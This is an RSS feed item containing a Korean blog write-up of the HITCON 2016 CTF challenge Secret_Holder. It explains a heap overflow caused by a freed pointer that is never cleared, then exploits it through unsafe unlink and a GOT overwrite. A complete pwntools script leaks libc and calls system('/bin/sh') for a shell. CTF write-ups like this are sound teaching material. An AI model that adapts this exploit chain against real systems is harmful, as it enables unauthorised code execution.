    <item>
      <title>[ hitcon 2016 ] Secret_Holder </title>
      <link>http://mhibio.github.io/2020/02/04/hitcon-2016-secret-holder/</link>
      <guid>http://mhibio.github.io/2020/02/04/hitcon-2016-secret-holder/</guid>
      <pubDate>Tue, 04 Feb 2020 07:04:37 GMT</pubDate>
      <description>
      
        &lt;h1 id=&quot;hitcon-2016-Secret-Holder&quot;&gt;&lt;a href=&quot;#hitcon-2016-Secret-Holder&quot; class=&quot;headerlink&quot; title=&quot;[ hitcon 2016 ] Secret_Holder&quot;&gt;&lt;/a&gt;[ hitcon 2016 ] Secret_Holder&lt;/h1&gt;&lt;p&gt;simple &lt;code&gt;unsafe unlink&lt;/code&gt; prob&lt;/p&gt;
&lt;h2 id=&quot;binary-summary&quot;&gt;&lt;a href=&quot;#binary-summary&quot; class=&quot;headerlink&quot; title=&quot;binary summary&quot;&gt;&lt;/a&gt;binary summary&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;heap overflow&lt;/li&gt;
&lt;li&gt;unsafe unlink&lt;/li&gt;
&lt;li&gt;got overwrite&lt;/li&gt;&lt;/ul&gt;
      
      </description>
      
      
      <content:encoded><![CDATA[<h1 id="hitcon-2016-Secret-Holder"><a href="#hitcon-2016-Secret-Holder" class="headerlink" title="[ hitcon 2016 ] Secret_Holder"></a>[ hitcon 2016 ] Secret_Holder</h1><p>simple <code>unsafe unlink</code> prob</p><h2 id="binary-summary"><a href="#binary-summary" class="headerlink" title="binary summary"></a>binary summary</h2><ul><li>heap overflow</li><li>unsafe unlink</li><li>got overwrite<a id="more"></a></li></ul><h2 id="menu"><a href="#menu" class="headerlink" title="menu"></a>menu</h2><ul><li>keep </li><li>wipe</li><li>renew</li></ul><h3 id="keep"><a href="#keep" class="headerlink" title="keep"></a>keep</h3><ul><li>small - <code>40 byte</code></li><li>big - <code>4000</code></li><li>huge - <code>400000</code><br>위 <code>size</code>로 한개씩만 할당가능</li></ul><h3 id="wipe"><a href="#wipe" class="headerlink" title="wipe"></a>wipe</h3><p>각 <code>chunk</code>들을 <code>free</code>해준다.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">read</span>(<span class="number">0</span>, &amp;s, <span class="number">4u</span>LL);</span><br><span class="line">v0 = atoi(&amp;s);</span><br><span class="line"><span class="keyword">switch</span> ( v0 )</span><br><span class="line">{</span><br><span class="line">  <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">    <span class="built_in">free</span>(big_ptr);</span><br><span class="line">    big_condition = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">    <span class="built_in">free</span>(huge_ptr);</span><br><span class="line">    huge_condition = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">    <span class="built_in">free</span>(small_ptr);</span><br><span class="line">    small_condition = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><code>free</code>하고 포인터를 초기화 하지않아서 취약점이 존재한다. </p><h3 id="reew"><a href="#reew" class="headerlink" title="reew"></a>reew</h3><p><code>size</code>별로 <code>edit</code>해준다.</p><h2 id="trigger"><a href="#trigger" class="headerlink" title="trigger"></a>trigger</h2><p><code>heap overflow</code>를 만들어서 <code>unsafe unlink</code>를 해야한다.<br><code>small secret</code>의 포인터를 <code>big secret</code>의 포인터가 가르키게 하고,<br><code>renew</code>가능한 조건을 만족한다면,<br><code>big secret</code>을 <code>renew</code>함으로써 <code>heap overflow</code>을 발생시킬 수 있다.</p><p>그다음에는 알아서 <code>got overwrite</code>으로 <code>leak</code>하고 쉘따면 된다.</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./SecretHolder"</span>)</span><br><span class="line">e = ELF(<span class="string">"./SecretHolder"</span>)</span><br><span class="line">l = e.libc</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">keep</span><span class="params">(size, data)</span>:</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.sendafter(<span class="string">': '</span>, str(data))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wipe</span><span class="params">(size)</span>:</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">renew</span><span class="params">(size, data)</span>:</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.sendafter(<span class="string">": "</span>, str(data))</span><br><span class="line"></span><br><span class="line">keep(<span class="number">1</span>, <span class="string">'bb'</span>)</span><br><span class="line">wipe(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">keep(<span class="number">2</span>, <span class="string">'bb'</span>)</span><br><span class="line">wipe(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">keep(<span class="number">1</span>, <span class="string">'aa'</span>)</span><br><span class="line"></span><br><span class="line">keep(<span class="number">3</span>, <span class="string">'a'</span>)</span><br><span class="line">wipe(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">keep(<span class="number">3</span>, <span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line">pay = p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">pay += p64(<span class="number">0x6020b0</span> - <span class="number">0x18</span>) </span><br><span class="line">pay += p64(<span class="number">0x6020b0</span> - <span class="number">0x10</span>) </span><br><span class="line">pay += p64(<span class="number">0x20</span>)</span><br><span class="line">pay += p64(<span class="number">0x61a90</span>)</span><br><span class="line">renew(<span class="number">2</span>, pay)</span><br><span class="line"></span><br><span class="line">wipe(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">pay = p64(<span class="number">0</span>)</span><br><span class="line">pay += p64(e.got[<span class="string">'free'</span>])</span><br><span class="line">pay += p64(<span class="number">0x602090</span>)</span><br><span class="line"></span><br><span class="line">renew(<span class="number">1</span>, pay)</span><br><span class="line">renew(<span class="number">2</span>, p64(e.plt[<span class="string">'puts'</span>]))</span><br><span class="line"></span><br><span class="line">wipe(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">libc = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - l.sym[<span class="string">'_IO_2_1_stdout_'</span>]</span><br><span class="line">log.info(hex(libc))</span><br><span class="line"></span><br><span class="line">renew(<span class="number">2</span>, p64(libc+l.sym[<span class="string">'system'</span>]))</span><br><span class="line">keep(<span class="number">3</span>, <span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">wipe(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content:encoded>
      
